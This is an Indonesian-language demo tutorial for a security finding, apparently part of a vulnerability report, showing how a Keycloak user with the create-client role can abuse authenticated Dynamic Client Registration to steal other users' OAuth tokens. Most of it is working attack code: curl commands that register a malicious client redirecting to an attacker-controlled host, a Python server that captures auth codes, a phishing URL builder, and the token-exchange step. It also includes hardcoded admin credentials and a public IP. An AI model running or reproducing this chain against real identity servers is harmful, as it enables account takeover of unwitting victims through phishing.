# Tutorial: Finding #5 — DCR Trusted Hosts Bypass → Pencurian Token via Phishing Live

**Severity:** HIGH (CVSS 8.0)
**Waktu demo:** ~10 menit
**Kebutuhan:** 2 Terminal + 1 Browser
**Ini finding paling impactful — full token theft dari victim secara real-time!**

---

## Skenario Serangan

1. **Attacker** (punya akun biasa + role `create-client`) menjalankan script
2. Script otomatis register client jahat, buat URL phishing, jalankan server penangkap
3. **Attacker** kirim URL phishing ke **victim** (via email, chat, dll)
4. **Victim** klik link → melihat halaman login Keycloak yang 100% asli → login
5. Auth code otomatis dikirim ke server attacker → ditukar jadi **token victim**

---

## Langkah 0: Pastikan Keycloak Berjalan

```bash
curl -s http://localhost:8080/realms/test | python3 -c "import sys,json; print('Keycloak OK:', json.load(sys.stdin)['realm'])"
```

---

## Langkah 1: (ADMIN SETUP) Assign create-client Role ke testuser

### Via Admin Console:
1. Buka: `http://46.101.162.187:8080/admin/master/console/`
2. Login: `admin` / `Admin1234`
3. Realm **test** → **Users** → klik **testuser**
4. Tab **Role mappings** → klik **Assign role**
5. Filter by client → pilih **realm-management**
6. Centang **create-client** → klik **Assign**

### Atau via CLI:
```bash
ADMIN_TOKEN=$(curl -s -X POST http://localhost:8080/realms/master/protocol/openid-connect/token \
  -d "client_id=admin-cli&grant_type=password&username=admin&password=Admin1234" \
  | python3 -c "import sys,json; print(json.load(sys.stdin)['access_token'])")

USER_ID=$(curl -s -H "Authorization: Bearer $ADMIN_TOKEN" \
  "http://localhost:8080/admin/realms/test/users?username=testuser" \
  | python3 -c "import sys,json; print(json.load(sys.stdin)[0]['id'])")

RM_CLIENT=$(curl -s -H "Authorization: Bearer $ADMIN_TOKEN" \
  "http://localhost:8080/admin/realms/test/clients?clientId=realm-management" \
  | python3 -c "import sys,json; print(json.load(sys.stdin)[0]['id'])")

CREATE_ROLE=$(curl -s -H "Authorization: Bearer $ADMIN_TOKEN" \
  "http://localhost:8080/admin/realms/test/clients/$RM_CLIENT/roles/create-client")

curl -s -o /dev/null -w "Assign role: HTTP %{http_code}\n" -X POST \
  -H "Authorization: Bearer $ADMIN_TOKEN" \
  -H "Content-Type: application/json" \
  -d "[$CREATE_ROLE]" \
  "http://localhost:8080/admin/realms/test/users/$USER_ID/role-mappings/clients/$RM_CLIENT"
```

---

## Cara A: Jalankan Python PoC (Otomatis — Recommended untuk Demo Video)

### Terminal 1 — Jalankan script serangan:

```bash
cd /home/anggi/keycloak-research
python3 pocs/poc_f5_dcr_hijack.py --host http://46.101.162.187:8080 --listen-port 48888
```

Script akan:
1. Otomatis login sebagai attacker (testuser)
2. Register client jahat via DCR
3. Buat URL phishing
4. Jalankan server penangkap di port 48888
5. Menunggu victim mengklik URL dan login...

**Output yang muncul:**
```
╔══════════════════════════════════════════════════════════════╗
║                 URL PHISHING SIAP KIRIM                      ║
╚══════════════════════════════════════════════════════════════╝

Kirim URL berikut ke target victim:

http://46.101.162.187:8080/realms/test/protocol/openid-connect/auth?client_id=XXXXX&response_type=code&redirect_uri=http%3A%2F%2F46.101.162.187%3A48888%2Fcallback&scope=openid+profile+email

⠋ Menunggu victim... (5s / 300s) — Buka URL di browser untuk simulasi
```

### Browser — Simulasi victim:

1. **Copy URL phishing** dari output Terminal 1
2. **Buka URL tersebut di browser**
3. Akan muncul **halaman login Keycloak yang 100% asli** — tidak ada tanda-tanda mencurigakan!
4. Login sebagai victim:
   - Username: `victim`
   - Password: `Password123`
5. Setelah login, victim melihat halaman **"Login Berhasil!"** (padahal ini halaman palsu dari attacker)

### Kembali ke Terminal 1 — Auth code tertangkap otomatis:

```
=======================================================
  *** AUTH CODE VICTIM TERTANGKAP! ***
=======================================================
  Code: 7e7cad47-b4b2-e780-9295-6dd0c51e7e9e...
=======================================================

[Langkah 7] ATTACKER — Tukar auth code curian menjadi token victim

╔══════════════════════════════════════════════════════════════╗
║           TOKEN VICTIM BERHASIL DICURI!                      ║
╚══════════════════════════════════════════════════════════════╝

  Username     : victim
  Email        : victim@test.com
  Nama Lengkap: Victim User
  Scope        : openid profile email
  Access Token : eyJhbGciOiJSUzI1NiIsInR5cCI...
  Refresh Token: eyJhbGciOiJIUzUxMiIsInR5cCI...

Attacker sekarang punya akses penuh ke akun victim!
```

### Mode Auto-Victim (untuk testing tanpa browser):

```bash
python3 pocs/poc_f5_dcr_hijack.py --host http://46.101.162.187:8080 --auto-victim --timeout 30
```

Flag `--auto-victim` akan otomatis simulasi login victim tanpa perlu browser.

---

## Cara B: Manual Step-by-Step (Untuk Pemahaman Detail)

### Langkah 2: (ATTACKER) Login dan Dapatkan Token

```bash
ATTACKER_TOKEN=$(curl -s -X POST http://46.101.162.187:8080/realms/test/protocol/openid-connect/token \
  -d "client_id=webapp" \
  -d "grant_type=password" \
  -d "username=testuser" \
  -d "password=Password123" \
  -d "scope=openid" \
  | python3 -c "import sys,json; print(json.load(sys.stdin)['access_token'])")

echo "Attacker token: ${ATTACKER_TOKEN:0:40}..."
```

### Langkah 3: (ATTACKER) Register Client Jahat via DCR

```bash
REG_RESP=$(curl -s -X POST http://46.101.162.187:8080/realms/test/clients-registrations/openid-connect \
  -H "Authorization: Bearer $ATTACKER_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "client_name": "Aplikasi Resmi Perusahaan",
    "redirect_uris": ["http://46.101.162.187:48888/callback"],
    "grant_types": ["authorization_code","refresh_token"],
    "response_types": ["code"]
  }')

echo "$REG_RESP" | python3 -c "
import sys,json
d = json.load(sys.stdin)
print('=== CLIENT JAHAT TERDAFTAR! ===')
print(f'Client ID:     {d[\"client_id\"]}')
print(f'Client Secret: {d[\"client_secret\"]}')
print(f'Redirect URI:  {d[\"redirect_uris\"]}')
print('================================')
"

MAL_CLIENT_ID=$(echo "$REG_RESP" | python3 -c "import sys,json; print(json.load(sys.stdin)['client_id'])")
MAL_SECRET=$(echo "$REG_RESP" | python3 -c "import sys,json; print(json.load(sys.stdin)['client_secret'])")
```

> **VULNERABLE:** Client dengan redirect ke server attacker berhasil terdaftar tanpa penolakan!

### Langkah 4: (KONTROL) Anonymous DCR — Harus Ditolak

```bash
curl -s -X POST http://46.101.162.187:8080/realms/test/clients-registrations/openid-connect \
  -H "Content-Type: application/json" \
  -d '{"client_name":"anon-test","redirect_uris":["http://46.101.162.187:48888/callback"]}' \
  | python3 -m json.tool
```

**Output (Benar Ditolak):**
```json
{
  "error": "insufficient_scope",
  "error_description": "Policy 'Trusted Hosts' rejected request... Host not trusted."
}
```

### Langkah 5: (ATTACKER) Jalankan Server Penangkap (Terminal 2)

Buka terminal baru — ini server yang akan menangkap auth code victim:

```bash
python3 -c "
from http.server import HTTPServer, BaseHTTPRequestHandler
import urllib.parse

class H(BaseHTTPRequestHandler):
    def do_GET(self):
        params = urllib.parse.parse_qs(urllib.parse.urlparse(self.path).query)
        if 'code' in params:
            code = params['code'][0]
            print()
            print('=' * 55)
            print('  *** AUTH CODE VICTIM TERTANGKAP! ***')
            print('=' * 55)
            print(f'  Code: {code}')
            print('=' * 55)
            print()
            print('Gunakan code ini di Langkah 8 untuk curi token victim!')
            print()
        self.send_response(200)
        self.send_header('Content-Type','text/html')
        self.end_headers()
        self.wfile.write(b'<html><body><h2>Login Berhasil!</h2><p>Halaman ini dapat ditutup.</p></body></html>')
    def log_message(self, *a): pass

print('Server penangkap aktif di port 48888...')
print('Menunggu victim klik URL phishing dan login...')
HTTPServer(('0.0.0.0', 48888), H).serve_forever()
"
```

### Langkah 6: (ATTACKER) Buat URL Phishing (Terminal 1)

```bash
echo ""
echo "=== URL PHISHING ==="
echo "Kirim URL ini ke victim:"
echo ""
echo "http://46.101.162.187:8080/realms/test/protocol/openid-connect/auth?client_id=${MAL_CLIENT_ID}&response_type=code&redirect_uri=http%3A%2F%2F46.101.162.187%3A48888%2Fcallback&scope=openid+profile+email"
echo ""
echo "URL ini terlihat 100% legitimate — domain Keycloak asli!"
echo "===================="
```

### Langkah 7: (VICTIM) Klik URL dan Login

1. **Buka URL phishing di browser**
2. Halaman login **Keycloak asli** muncul — tidak ada tanda mencurigakan
3. Login sebagai victim:
   - Username: `victim`
   - Password: `Password123`
4. Victim melihat halaman "Login Berhasil!" (palsu dari attacker)

**Di Terminal 2 (server penangkap) muncul:**
```
=======================================================
  *** AUTH CODE VICTIM TERTANGKAP! ***
=======================================================
  Code: 7e7cad47-b4b2-e780-9295-6dd0c51e7e9e.J191clIaMcw...
=======================================================
```

### Langkah 8: (ATTACKER) Tukar Auth Code → Token Victim

```bash
# Ganti AUTH_CODE dengan code yang tertangkap di Terminal 2
AUTH_CODE="PASTE_CODE_DARI_TERMINAL_2"

curl -s -X POST http://46.101.162.187:8080/realms/test/protocol/openid-connect/token \
  -d "client_id=$MAL_CLIENT_ID" \
  -d "client_secret=$MAL_SECRET" \
  -d "grant_type=authorization_code" \
  -d "code=$AUTH_CODE" \
  -d "redirect_uri=http://46.101.162.187:48888/callback" \
  | python3 -c "
import sys,json,base64
d = json.load(sys.stdin)
if 'error' in d:
    print('Error:', d)
    sys.exit(1)

at = d['access_token']
payload = at.split('.')[1] + '=='
claims = json.loads(base64.b64decode(payload))

print()
print('====================================')
print('  TOKEN VICTIM BERHASIL DICURI!')
print('====================================')
print(f'  Username:      {claims.get(\"preferred_username\")}')
print(f'  Email:         {claims.get(\"email\")}')
print(f'  Nama:          {claims.get(\"name\")}')
print(f'  User ID:       {claims.get(\"sub\")}')
print(f'  Scope:         {d.get(\"scope\")}')
print(f'  Access Token:  {at[:50]}...')
print(f'  Refresh Token: {d.get(\"refresh_token\",\"\")[:50]}...')
print('====================================')
print()
print('Attacker sekarang punya akses penuh ke akun victim!')
"
```

### Langkah 9: (ATTACKER) Verifikasi — Akses Data Victim

```bash
# Ambil access token dari langkah sebelumnya
VICTIM_TOKEN=$(curl -s -X POST http://46.101.162.187:8080/realms/test/protocol/openid-connect/token \
  -d "client_id=$MAL_CLIENT_ID" \
  -d "client_secret=$MAL_SECRET" \
  -d "grant_type=authorization_code" \
  -d "code=$AUTH_CODE" \
  -d "redirect_uri=http://46.101.162.187:48888/callback" \
  | python3 -c "import sys,json; print(json.load(sys.stdin).get('access_token',''))")

curl -s http://46.101.162.187:8080/realms/test/protocol/openid-connect/userinfo \
  -H "Authorization: Bearer $VICTIM_TOKEN" \
  | python3 -m json.tool
```

---

## Ringkasan

| Langkah | Aksi | Hasil |
|---|---|---|
| 1 | Attacker register client via authenticated DCR | Client dengan redirect ke server attacker — **BERHASIL** |
| 2 | Kontrol: Anonymous DCR | **DITOLAK** oleh Trusted Hosts (benar) |
| 3 | Attacker generate URL phishing | URL 100% legitimate domain Keycloak |
| 4 | Server penangkap menunggu victim | Listener aktif, siap tangkap auth code |
| 5 | Victim klik URL, login di Keycloak asli | Auth code redirect ke server attacker — **TERTANGKAP** |
| 6 | Attacker tukar auth code | Token victim — **DICURI PENUH** |
| 7 | Akses data victim | Userinfo berhasil diakses — **TERVERIFIKASI** |

**Policy Gap:**
- **Anonymous DCR:** Trusted Hosts DITERAPKAN (benar)
- **Authenticated DCR:** Trusted Hosts **TIDAK ADA** (kerentanan)
- **Admin REST API:** Return 403 (benar)

**Alur Serangan:**
```
Attacker jalankan script
        │
        ▼
Register client jahat (redirect → server attacker)
        │
        ▼
Generate URL phishing (domain Keycloak asli)
        │
        ▼
Kirim URL ke victim ──────► Victim klik URL
                                    │
                                    ▼
                            Halaman login Keycloak ASLI
                                    │
                                    ▼
                            Victim login (victim / Password123)
                                    │
                                    ▼
                            Keycloak redirect + auth code
                                    │
                                    ▼
                    Server attacker tangkap auth code ◄──┘
                                    │
                                    ▼
                    Tukar code → token victim
                                    │
                                    ▼
                    AKSES PENUH KE AKUN VICTIM
```

**Kesimpulan:** Satu user dengan role `create-client` bisa mencuri token user manapun di realm yang sama, termasuk admin. Serangan ini sangat berbahaya karena victim melihat halaman login yang 100% asli dari domain Keycloak.
